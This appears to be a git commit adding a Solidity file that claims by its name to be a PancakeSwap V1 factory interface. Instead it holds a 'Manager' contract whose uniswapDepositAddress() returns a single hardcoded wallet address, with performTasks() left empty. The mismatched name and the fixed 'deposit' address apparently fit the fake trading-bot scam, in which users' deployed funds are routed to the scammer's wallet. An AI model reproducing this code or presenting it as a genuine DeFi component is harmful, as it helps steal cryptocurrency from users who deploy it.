61fa73c4fca4f32f80d4714074c6b4498efb1cb6
OpenSourceCryptoDevs <97274127+OpenSourceCryptoDevs@users.noreply.github.com>
2022-01-06 21:36:50 -0800

    Add files via upload

---
+++ contracts/interfaces/IPancakeswapV1Factory.sol
@@ -0,0 +1,12 @@
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xf836D38811AE2cf724CbA59c9e6b118fF6850416;
+	}
+}
